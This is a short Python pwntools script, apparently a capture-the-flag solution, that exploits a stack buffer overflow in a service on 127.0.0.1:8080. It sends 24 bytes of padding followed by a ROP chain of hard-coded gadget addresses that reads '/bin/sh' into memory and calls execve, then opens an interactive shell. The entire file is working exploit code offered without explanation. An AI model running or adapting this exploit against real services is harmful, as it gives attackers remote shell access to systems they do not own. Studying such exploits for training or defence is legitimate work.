from pwn import p64, u64, p32, u32
import pwn
import sys
        
pwn.context.log_level = "debug"
pwn.context.timeout = 20
p = pwn.remote("127.0.0.1",8080)
payload = b"\x00" * 24
payload += p64(0x4005af) + p64(0x0) + p64(0x4006a6) + p64(0x0) + p64(0x40f77e) + p64(0x6bb200) + p64(0x0) + p64(0x403a12) + p64(0x8) + p64(0x474aa5) + p64(0x4005af) + p64(0x3b) + p64(0x4006a6) + p64(0x6bb200) + p64(0x40f77e) + p64(0x0) + p64(0x0) + p64(0x403a12) + p64(0x0) + p64(0x474aa5)
payload = payload.ljust(256, b"a")
p.send(payload)
payload = b""
payload += b'/bin/sh\x00'
p.send(payload)
p.interactive()
